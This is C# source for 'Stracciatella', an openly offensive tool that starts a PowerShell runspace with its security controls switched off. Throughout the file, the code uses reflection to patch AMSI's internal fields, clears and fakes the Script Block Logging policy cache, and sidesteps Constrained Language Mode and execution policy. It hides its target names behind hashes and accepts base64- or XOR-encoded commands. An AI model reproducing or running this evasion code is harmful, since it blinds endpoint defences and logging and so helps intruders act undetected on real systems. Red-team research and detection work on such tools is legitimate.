using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.IO;
using System.Linq;
using System;
using System.Text;
using System.Runtime.InteropServices;
using System.Globalization;
using System.Reflection;
using System.Collections.Generic;

namespace Stracciatella
{
    class Stracciatella
    {
        private static string GLOBAL_PROMPT_PREFIX = "Stracciatella";

        internal class Options
        {
            public string[] ValidOptions = {
                "-v", "--verbose",
                "-f", "--force",
                "-c", "--command",
                "-b", "--base64",
                "-x", "--xor"
            };

            public bool Verbose { get; set; }
            public string Command { get; set; }
            public bool Base64 { get; set; }
            public Byte XorKey { get; set; }
            public bool Force { get; set; }
            public string ScriptPath { get; set; }
            public bool Parashell { get; set; }

            public Options()
            {
                Base64 = false;
                Verbose = false;
                Force = false;
                XorKey = 0;
                Command = "";
                ScriptPath = "";
                Parashell = false;
            }
        }

        private static Options ProgramOptions;

        private static void PrintBanner()
        {
            Console.WriteLine("");
            Console.WriteLine("  :: Stracciatella - Powershell runspace with AMSI and Script Block Logging disabled.");
            Console.WriteLine("  Mariusz B. / mgeeky, '19 <mb@binary-offensive.com>");
            Console.WriteLine("");
        }

        private static void Usage()
        {
            PrintBanner();
            Console.WriteLine("Usage: stracciatella.exe [options] [script]");
            Console.WriteLine("  script                - Path to file containing Powershell script to execute. If not options given, will enter a pseudo-shell loop.");
            Console.WriteLine("  -v, --verbose         - Prints verbose informations");
            Console.WriteLine("  -f, --force           - Proceed with execution even if Powershell defenses were not disabled. By default we bail out on failure.");
            Console.WriteLine("  -c, --command         - Executes the specified commands.");
            Console.WriteLine("                          If command and script parameters were given, executes command after running script.");
            Console.WriteLine("  -b, --base64          - Consider input as Base64 encoded. If both options, --base64 and --xor are specified,");
            Console.WriteLine("                          the program will peel them off accordingly: Base64Decode(XorDecode(data, XorKey))");
            Console.WriteLine("  -x <key>, --xor <key> - Consider input as XOR encoded, where <key> is a hex 8bit value being a key");
        }

        private static Options ParseOptions(string[] args)
        {
            var options = new Options();

            if (args.Length < 1)
            {
                options.Parashell = true;
                return options;
            }

            int i = 0;
            HashSet<string> processed = new HashSet<string>();

            for(; i < args.Length; i++)
            {
                string arg = args[i];
                if(string.Equals(arg, "-v") || string.Equals(arg, "--verbose"))
                {
                    options.Verbose = true;
                    processed.Add(arg);
                }
                else if (string.Equals(arg, "-b") || string.Equals(arg, "--base64"))
                {
                    options.Base64 = true;
                    processed.Add(arg);
                }
                else if (string.Equals(arg, "-f") || string.Equals(arg, "--force"))
                {
                    options.Force = true;
                    processed.Add(arg);
                }
                else if (string.Equals(arg, "-c") || string.Equals(arg, "--command"))
                {
                    if(args.Length - 1 < i + 1)
                    {
                        throw new ArgumentException("No value for Command argument.");
                    }

                    options.Command = args[i+1];
                    processed.Add(arg);
                    processed.Add(args[i + 1]);
                    i += 1;
                }
                else if (string.Equals(arg, "-x") || string.Equals(arg, "--xor"))
                {
                    if (args.Length - 1 < i + 1)
                    {
                        throw new ArgumentException("No value for XorKey argument.");
                    }

                    string n = args[i + 1];
                    if (!n.StartsWith("0x"))
                    {
                        n = $"0x{n}";
                    }
                    options.XorKey = Byte.Parse(n.Substring(2), NumberStyles.HexNumber);
                    processed.Add(arg);
                    processed.Add(args[i + 1]);
                    i += 1;
                }
                else if ((i < args.Length - 1) && !options.ValidOptions.Contains(arg))
                {
                    throw new ArgumentException($"Unknown parameter '{arg}'.");
                }
            }

            if ((i - 1 < args.Length) && (File.Exists(args[i - 1])))
            {
                options.ScriptPath = args[i - 1];
            }
            else if ((i - 1 < args.Length) && !processed.Contains(args[i - 1]))
            {
                options.ScriptPath = args[i - 1];
            }
            else if (options.Command.Length == 0)
            {
                options.Parashell = true;
            }
            else if (options.Command.Length > 0)
            {

            }
            else
            {
                throw new ArgumentException("You must either specify command or path to a script to execute.");
            }

            if(options.Base64 || options.XorKey != 0)
            {
                if(options.Command.Length == 0 && options.ScriptPath.Length == 0)
                {
                    throw new ArgumentException("Specifying Base64 or XorKey options makes no sense if no command or script path given.");
                }
            }

            return options;
        }

        public static void Info(string fmt)
        {
            if(ProgramOptions.Verbose)
            {
                Console.WriteLine(fmt);
            }
        }

        private static ulong GetHash(string data)
        {
            ulong val = 5381;
            data = data.ToLower();
            foreach(char b in data)
            {
                UInt32 n = (UInt32)((val << 5) & 0xffffffff);
                val = (n + val) + b;
            }

            return val;
        }

        private static bool DisableDefenses(PowerShell rs, CustomPSHost host)
        {
            bool ret = true;

            ret &= DisableClm.DoDisable(rs);

            string l = ExecuteCommand("$ExecutionContext.SessionState.LanguageMode", rs, host, true);
            Info($"[.] Language Mode: {l}");

            if(ret && String.Equals(l, "FullLanguage", StringComparison.CurrentCultureIgnoreCase))
            {
                Info("[+] Constrained Language Mode Disabled.");
            }
            else
            {
                Info("[-] Constrained Language Mode not disabled.");
            }

            if ((ret &= DisableScriptLogging(rs)))
            {
                Info("[+] Script Block Logging Disabled.");
            }
            else
            {
                Info("[-] Script Block Logging not disabled.");
            }

            if ((ret &= DisableAmsi(rs)))
            {
                Info("[+] AMSI Disabled.");
            }
            else
            {
                Info("[-] AMSI not disabled.");
            }

            return ret;
        }

        public static bool DisableAmsi(PowerShell rs)
        {
            bool ret = false;
            ret |= DisableAmsiTechnique1(rs);
            ret |= DisableAmsiTechnique2(rs);
            return ret;
        }

        public static bool DisableAmsiTechnique1(PowerShell rs)
        {
            AppDomain currentDomain = AppDomain.CurrentDomain;
            Assembly[] assems = currentDomain.GetAssemblies();

            foreach (Assembly assem in assems)
            {
                if(assem.GlobalAssemblyCache && GetHash(assem.Location.Split('\\').Last()) == 65764965518) // SysXtem.ManaXgement.AutomaXtion.dll
                {
                    Type[] types = assem.GetTypes();
                    foreach (var tp in types)
                    {
                        if(GetHash(tp.Name) == 13944524928) // AmsiUXtils
                        {
                            var fields = tp.GetFields(BindingFlags.NonPublic|BindingFlags.Static);
                            foreach (var f in fields)
                            {
                                if (GetHash(f.Name) == 27628075080) // amsiInXitFaXiled
                                {
                                    f.SetValue(null, true);
                                    return (bool)f.GetValue(null);
                                }
                            }
                        }
                    }
                }
            }

            return false;
        }

        public static bool DisableAmsiTechnique2(PowerShell rs)
        {
            AppDomain currentDomain = AppDomain.CurrentDomain;
            Assembly[] assems = currentDomain.GetAssemblies();

            foreach (Assembly assem in assems)
            {
                if (assem.GlobalAssemblyCache && GetHash(assem.Location.Split('\\').Last()) == 65764965518) // SysXtem.ManaXgement.AutomaXtion.dll
                {
                    Type[] types = assem.GetTypes();
                    foreach (var tp in types)
                    {
                        if (GetHash(tp.Name) == 13944524928) // AmsiUXtils
                        {
                            var fields = tp.GetFields(BindingFlags.NonPublic | BindingFlags.Static);
                            foreach (var f in fields)
                            {
                                if (GetHash(f.Name) == 21195228531) // amsiSesXsion
                                {
                                    f.SetValue(null, null);
                                }
                                else if (GetHash(f.Name) == 18097066420) // amsiConXtext
                                {
                                    IntPtr hglobal = Marshal.AllocHGlobal(9077);
                                    f.SetValue(null, hglobal);
                                }
                            }
                        }
                    }
                }
            }

            return false;
        }

        public static bool DisableScriptLogging(PowerShell rs)
        {
            bool ret = false;
            string param = "";
            ret |= DisableScriptLoggingTechnique1(rs, ref param);
            ret |= DisableScriptLoggingTechnique2(rs, param);
            return ret;
        }

        public static bool DisableScriptLoggingTechnique1(PowerShell rs, ref string param)
        {
            AppDomain currentDomain = AppDomain.CurrentDomain;
            Assembly[] assems = currentDomain.GetAssemblies();

            foreach (Assembly assem in assems)
            {
                if (assem.GlobalAssemblyCache && GetHash(assem.Location.Split('\\').Last()) == 65764965518) // SysXtem.ManaXgement.AutomaXtion.dll
                {
                    Type[] types = assem.GetTypes();
                    foreach (var tp in types)
                    {
                        if (GetHash(tp.Name) == 12579468197) // UXtils
                        {
                            var fields = tp.GetFields(BindingFlags.NonPublic | BindingFlags.Static);
                            foreach (var f in fields)
                            {
                                if (GetHash(f.Name) == 12250760746)
                                {
                                    HashSet<string> names = (HashSet<string>)f.GetValue(null);
                                    foreach (var n in names)
                                    {
                                        if (GetHash(n) == 32086076268) // ScrXiptBloXckLogXging
                                        {
                                            param = n;
                                            break;
                                        }
                                    }

                                    // https://cobXXXbr.io/ScrXXXiptBlock-Warning-Event-Logging-BypXXXass.html
                                    f.SetValue(null, new HashSet<string>(StringComparer.OrdinalIgnoreCase) { });
                                    return true;
                                }
                            }
                        }
                    }
                }
            }

            return false;
        }

        public static bool DisableScriptLoggingTechnique2(PowerShell rs, string param)
        {
            AppDomain currentDomain = AppDomain.CurrentDomain;
            Assembly[] assems = currentDomain.GetAssemblies();

            foreach (Assembly assem in assems)
            {
                if (assem.GlobalAssemblyCache && GetHash(assem.Location.Split('\\').Last()) == 65764965518) // SysXtem.ManaXgement.AutomaXtion.dll
                {
                    Type[] types = assem.GetTypes();
                    foreach (var tp in types)
                    {
                        if (GetHash(tp.Name) == 12579468197) // UXtils
                        {
                            var fields = tp.GetFields(BindingFlags.NonPublic | BindingFlags.Static);
                            FieldInfo field = null;
                            foreach (var f in fields)
                            {
                                if (GetHash(f.Name) == 52485150955) // caXchedGrXoupPoXlicySettXings
                                {
                                    field = f;
                                    break;
                                }
                            }

                            if(field != null)
                            {
                                Dictionary<string, object> cached = (Dictionary<string, object>)field.GetValue(null);
                                string key = param;

                                if (key.Length == 0)
                                {
                                    foreach (string k in cached.Keys)
                                    {
                                        if (GetHash(k) == 32086076268) // ScrXiptBloXckLogXging
                                        {
                                            key = k;
                                            break;
                                        }
                                    }
                                }

                                if(key.Length > 0 && cached[key] != null)
                                {
                                    Dictionary<string, object> cached2 = (Dictionary<string, object>)cached[key];
                                    string k2 = "";
                                    string k3 = "";

                                    foreach (string k in cached2.Keys)
                                    {
                                        if (GetHash(k) == 45083803091) // EnabXleScrXiptBloXckLogXging
                                        {
                                            k2 = k;
                                        }
                                        else if (GetHash(k) == 70211596397) // EnabXleScrXiptBloXckInvocXationLogXging
                                        {
                                            k3 = k;
                                        }
                                    }

                                    if (k2.Length > 0 && cached2[k2] != null) cached2[k2] = 0;
                                    if (k3.Length > 0 && cached2[k3] != null) cached2[k3] = 0;
                                }

                                var newCache = new Dictionary<string, object>();
                                newCache.Add($"Enable{param}", 0);
                                string param2 = param.Replace("kL", "kInvocationL");
                                newCache.Add($"Enable{param2}", 0);
                                cached[$"HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\{param}"] = newCache;

                                return true;
                            }
                        }
                    }
                }
            }

            return false;
        }

        private static string Execute(string scriptPath, string command)
        {
            string output = "";
            CustomPSHost host = new CustomPSHost();
            var state = InitialSessionState.CreateDefault();
            state.AuthorizationManager = null;                  // Bypasses PowerShell execution policy

            using (Runspace runspace = RunspaceFactory.CreateRunspace(host, state))
            {
                runspace.Open();

                using (var ps = PowerShell.Create())
                {
                    ps.Runspace = runspace;
                    if (!DisableDefenses(ps, host))
                    {
                        Info("[-] Could not disable all of the Powershell defenses.");
                        if (!ProgramOptions.Force)
                        {
                            Info("[-] Bailing out...");
                        }
                    }

                    string scriptContents = "";
                    if (scriptPath.Length > 0)
                    {
                        scriptContents = GetFileContents(scriptPath);

                        Info($"PS> & '{scriptPath}'");
                        output += ExecuteCommand(scriptContents, ps, host);

                        scriptContents = "";
                        scriptPath = "";
                        ProgramOptions.ScriptPath = "";
                    }

                    Info($"PS> {command}");
                    output += ExecuteCommand(command, ps, host);
                    command = "";

                    System.GC.Collect();
                }

                runspace.Close();
            }

            return output.Trim();
        }

        private static string ExecuteCommand(string command, PowerShell rs, CustomPSHost host, bool silent = false)
        {
            string output = "";
            if (command != null && command.Length > 0)
            {
                using (Pipeline pipe = rs.Runspace.CreatePipeline())
                {
                    try
                    {
                        if (ProgramOptions.Base64)
                        {
                            command = Decoder.Base64Decode(command);
                        }

                        if (ProgramOptions.XorKey != 0)
                        {
                            command = Decoder.XorDecode(command, ProgramOptions.XorKey);
                        }
                    }
                    catch (Exception e)
                    {
                        if(!silent)
                            Info($"[-] Could not decode command: {e.Message.ToString()}");
                    }

                    pipe.Commands.AddScript(command);
                    pipe.Commands[0].MergeMyResults(PipelineResultTypes.Error, PipelineResultTypes.Output);
                    pipe.Commands.Add("Out-default");

                    try
                    {
                        pipe.Invoke();

                        command = "";

                        output = ((CustomPSHostUserInterface)host.UI).Output;
                        ((CustomPSHostUserInterface)host.UI)._sb = new StringBuilder();
                    }
                    catch(Exception e)
                    {
                        Console.WriteLine(e.ToString());
                    }
                }
            }
            return output;
        }

        private static string Input(string prompt)
        {
            List<string> input = new List<string>();
            
            string line;
            Console.Write(prompt);
            while ((line = Console.ReadLine()) != null && line != "")
            {
                input.Add(line.Trim());

                // FIXME: Break after first line;
                break;
            }
            
            return String.Join("\r\n", input);
        }

        private static void Parashell()
        {
            CustomPSHost host = new CustomPSHost();
            var state = InitialSessionState.CreateDefault();
            state.AuthorizationManager = null;                  // Bypasses PowerShell execution policy

            using (Runspace runspace = RunspaceFactory.CreateRunspace(host, state))
            {
                runspace.Open();

                using (var ps = PowerShell.Create())
                {
                    ps.Runspace = runspace;
                    if (!DisableDefenses(ps, host))
                    {
                        Info("[-] Could not disable all of the Powershell defenses.");
                        if (!ProgramOptions.Force)
                        {
                            Info("[-] Bailing out...");
                        }
                    }

                    string input;
                    while(true)
                    {
                        string pwd = ExecuteCommand("(Resolve-Path .\\).Path", ps, host).Trim();
                        string prompt = $"{GLOBAL_PROMPT_PREFIX} {pwd}> ";
                        input = Input(prompt);

                        string output = ExecuteCommand(input, ps, host);
                        Console.WriteLine(output);

                        if (input == null || input.Length == 0
                            || String.Equals(input, "exit", StringComparison.CurrentCultureIgnoreCase)
                            || String.Equals(input, "quit", StringComparison.CurrentCultureIgnoreCase))
                        {
                            break;
                        }

                        input = "";
                    }
                }

                runspace.Close();
            }
        }

        private static string GetFileContents(string scriptPath)
        {
            string buf = "";
            try
            {
                buf = File.ReadAllText(scriptPath);
            }
            catch (Exception e)
            {
                Info($"[-] Could not open file: {e.Message}");
            }
            return buf;
        }

        static void Main(string[] args)
        {
            if ((args.Length >= 1) && (String.Equals(args[0], "--help", StringComparison.CurrentCultureIgnoreCase)
                || String.Equals(args[0], "/h", StringComparison.CurrentCultureIgnoreCase)
                || String.Equals(args[0], "/?", StringComparison.CurrentCultureIgnoreCase)
                || String.Equals(args[0], "-h", StringComparison.CurrentCultureIgnoreCase)))
            {
                Usage();
                return;
            }

            try
            {
                ProgramOptions = ParseOptions(args);
            }
            catch(ArgumentException e)
            {
                Console.WriteLine($"[-] Cannot parse arguments: {e.Message.ToString()}");
                Usage();
                return;
            }

            if (ProgramOptions.Verbose)
            {
                PrintBanner();
            }

            if (ProgramOptions.ScriptPath.Length > 0)
            {
                Info($"[.] Will load script file: '{ProgramOptions.ScriptPath}'");
            }
            else
            {
                Info($"[-] It looks like no script path was given.");
            }

            if (ProgramOptions.Parashell)
            {
                Parashell();
            }
            else
            {
                string output = Execute(ProgramOptions.ScriptPath, ProgramOptions.Command);
                Console.WriteLine(output);
            }
        }
    }
}
